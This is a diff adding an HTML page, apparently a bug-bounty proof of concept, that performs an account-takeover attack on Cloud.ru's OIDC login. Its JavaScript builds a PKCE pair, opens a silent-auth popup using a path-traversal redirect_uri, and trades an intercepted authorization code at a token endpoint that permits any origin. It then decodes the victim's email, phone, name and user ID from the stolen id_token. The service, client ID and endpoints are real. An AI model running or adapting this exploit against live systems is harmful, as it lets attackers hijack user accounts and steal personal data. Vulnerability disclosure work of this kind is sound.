@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<title>PoC: OIDC Code Theft — Cloud.ru</title>
+<style>
+*{box-sizing:border-box}
+body{font-family:monospace;background:#1a1a2e;color:#eee;padding:20px;max-width:900px;margin:0 auto}
+h1{color:#e94560}
+.step{background:#16213e;padding:15px;margin:10px 0;border-left:4px solid #444;border-radius:4px}
+.step.done{border-left-color:#4ade80}
+.step.active{border-left-color:#ffd700;background:#1a1f3e}
+button{background:#e94560;color:#fff;border:none;padding:10px 20px;font-size:15px;cursor:pointer;border-radius:4px;font-family:monospace;margin:4px 0}
+button:hover{background:#c73652}
+button:disabled{background:#555;cursor:not-allowed}
+#log{background:#0d1117;padding:15px;border-radius:4px;white-space:pre-wrap;font-size:12px;max-height:500px;overflow-y:auto;margin-top:15px;line-height:1.5}
+.w{color:#ffd700}.g{color:#4ade80}.r{color:#e94560}.b{color:#60a5fa}
+input[type=text]{width:100%;padding:8px;font-family:monospace;font-size:13px;background:#0d1117;color:#eee;border:1px solid #333;border-radius:4px;margin:6px 0}
+.tag{display:inline-block;background:#e94560;color:#fff;padding:2px 8px;border-radius:3px;font-size:11px;margin-right:6px}
+.tag.ok{background:#166534}
+.tag.warn{background:#854d0e}
+</style>
+</head>
+<body>
+<h1>ATTACKER PAGE — evil.example</h1>
+<p><span class="tag warn">BUG BOUNTY PoC</span> Cloud.ru OIDC redirect_uri + CORS * on token endpoint</p>
+<p>Origin: <b id="myorigin"></b> (это НЕ console.cloud.ru)</p>
+
+<div class="step" id="s1">
+<b>1. Generate PKCE</b> — attacker creates their own code_verifier/challenge<br>
+<button onclick="doStep1()">Generate PKCE pair</button>
+<pre id="o1"></pre>
+</div>
+
+<div class="step" id="s2">
+<b>2. Open popup</b> — victim clicks attacker's link, gets silently authed (prompt=none)<br>
+<button onclick="doStep2()" id="b2" disabled>Open OAuth popup (victim browser)</button>
+<pre id="o2"></pre>
+</div>
+
+<div class="step" id="s3">
+<b>3. SOP check</b> — can attacker read popup URL cross-origin?<br>
+<button onclick="doStep3()" id="b3" disabled>Try reading popup URL</button>
+<pre id="o3"></pre>
+</div>
+
+<div class="step" id="s4">
+<b>4. Exchange code</b> — paste code from popup address bar, attacker exchanges via CORS *<br>
+<input type="text" id="codeInput" placeholder="Paste the code= value from popup URL here">
+<button onclick="doStep4()" id="b4">Exchange code for tokens</button>
+<pre id="o4"></pre>
+</div>
+
+<div id="log"></div>
+
+<script>
+document.getElementById('myorigin').textContent = location.origin;
+
+let verifier, challenge, st, popup;
+
+function log(m,c){const e=document.getElementById('log');e.innerHTML+=`<span class="${c||''}">[${new Date().toLocaleTimeString()}] ${m}</span>\n`;e.scrollTop=e.scrollHeight}
+
+async function doStep1(){
+  const buf=new Uint8Array(32);crypto.getRandomValues(buf);
+  verifier=btoa(String.fromCharCode(...buf)).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
+  const d=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(verifier));
+  challenge=btoa(String.fromCharCode(...new Uint8Array(d))).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
+  st='attacker_'+Math.random().toString(36).slice(2,12);
+  document.getElementById('o1').textContent=
+    `code_verifier:  ${verifier}\ncode_challenge: ${challenge}\nstate:          ${st}`;
+  document.getElementById('s1').classList.add('done');
+  document.getElementById('b2').disabled=false;
+  log('PKCE pair generated. Attacker knows code_verifier.','g');
+}
+
+function doStep2(){
+  const p=new URLSearchParams({
+    client_id:'e95a1db5-a61c-425b-ae62-26d3a7e224f7',
+    redirect_uri:'https://console.cloud.ru/oidc/callback/../../spa/svp',
+    scope:'openid email profile',
+    response_type:'code',
+    code_challenge_method:'S256',
+    code_challenge:challenge,
+    state:st,
+    prompt:'none'
+  });
+  const url='https://id.cloud.ru/auth/system/openid/auth?'+p;
+  log('Opening popup: '+url.slice(0,100)+'...','w');
+  popup=window.open(url,'victim','width=900,height=600');
+  document.getElementById('o2').textContent='Popup opened.\nIf victim has active Cloud.ru session -> silent auth -> code in URL.\nLook at the popup address bar for ?code=...';
+  document.getElementById('s2').classList.add('done');
+  document.getElementById('b3').disabled=false;
+  log('Popup opened. Waiting for redirect...','b');
+
+  let n=0;
+  const iv=setInterval(()=>{
+    n++;
+    try{const u=popup.location.href;log('READ popup URL: '+u,'g');clearInterval(iv)}
+    catch(e){if(n>=20){clearInterval(iv);log('SOP blocked reading popup URL after '+n+' attempts (expected)','b')}}
+  },500);
+}
+
+function doStep3(){
+  log('Attempting to read popup.location.href ...','w');
+  try{
+    const u=popup.location.href;
+    document.getElementById('o3').innerHTML='<span class="g">URL read! '+u+'</span>';
+    log('SUCCESS: '+u,'g');
+  }catch(e){
+    document.getElementById('o3').innerHTML=
+      '<span class="r">Same-Origin Policy BLOCKS reading popup URL.</span>\n'+
+      '<span class="w">BUT: the code is ALREADY leaked to Yandex Metrika (mc.yandex.ru)</span>\n'+
+      '<span class="w">AND: CORS * on token endpoint means ANY code leak = account takeover</span>\n\n'+
+      'Copy the code= value from popup address bar and paste below.';
+    log('SOP blocked: '+e.message,'r');
+    log('Code is leaked to Yandex Metrika via page-url parameter on mc.yandex.ru','w');
+  }
+  document.getElementById('s3').classList.add('done');
+}
+
+async function doStep4(){
+  const code=document.getElementById('codeInput').value.trim();
+  if(!code){log('Paste the code first!','r');return}
+
+  log('Exchanging code from origin: '+location.origin,'w');
+  log('Using code_verifier: '+verifier.slice(0,20)+'...','b');
+
+  try{
+    const r=await fetch('https://id.cloud.ru/auth/system/openid/token',{
+      method:'POST',
+      headers:{'Content-Type':'application/x-www-form-urlencoded','X-Bug-Bounty':'bskybt'},
+      body:new URLSearchParams({
+        grant_type:'authorization_code',
+        code:code,
+        redirect_uri:'https://console.cloud.ru/oidc/callback/../../spa/svp',
+        client_id:'e95a1db5-a61c-425b-ae62-26d3a7e224f7',
+        code_verifier:verifier
+      })
+    });
+
+    log('HTTP '+r.status+' | ACAO: '+r.headers.get('access-control-allow-origin'),'b');
+    const d=await r.json();
+
+    if(d.access_token){
+      log('=== ACCOUNT TAKEOVER SUCCESSFUL ===','g');
+      log('access_token:  '+d.access_token.slice(0,30)+'... ('+d.access_token.length+' chars)','g');
+      log('id_token:      '+d.id_token.slice(0,30)+'... ('+d.id_token.length+' chars)','g');
+      log('refresh_token: '+d.refresh_token.slice(0,30)+'... ('+d.refresh_token.length+' chars)','g');
+      log('expires_in: '+d.expires_in+'s | refresh_expires_in: '+d.refresh_expires_in+'s','g');
+
+      try{
+        const claims=JSON.parse(atob(d.id_token.split('.')[1].replace(/-/g,'+').replace(/_/g,'/')));
+        log('','');
+        log('=== VICTIM PII FROM STOLEN id_token ===','g');
+        log('email:    '+claims.email,'g');
+        log('phone:    '+claims.phone_number,'g');
+        log('name:     '+claims.given_name+' '+claims.family_name,'g');
+        log('user_id:  '+claims.sub,'g');
+        log('username: '+claims.preferred_username,'g');
+        document.getElementById('o4').innerHTML=
+          '<span class="g">TOKENS OBTAINED from '+location.origin+'!</span>\n'+
+          'email: '+claims.email+'\nphone: '+claims.phone_number+'\nname: '+claims.given_name+' '+claims.family_name+'\nuser_id: '+claims.sub;
+      }catch(e){
+        document.getElementById('o4').innerHTML='<span class="g">TOKENS OBTAINED!</span> (id_token decode failed: '+e.message+')';
+      }
+    }else{
+      log('Error: '+JSON.stringify(d),'r');
+      document.getElementById('o4').innerHTML='<span class="r">'+d.error+': '+d.error_description+'</span>';
+    }
+  }catch(e){
+    log('Fetch error: '+e.message,'r');
+    // If CORS blocked, show that
+    document.getElementById('o4').innerHTML='<span class="r">Error: '+e.message+'</span>';
+  }
+  document.getElementById('s4').classList.add('done');
+}
+</script>
+</body>
+</html>
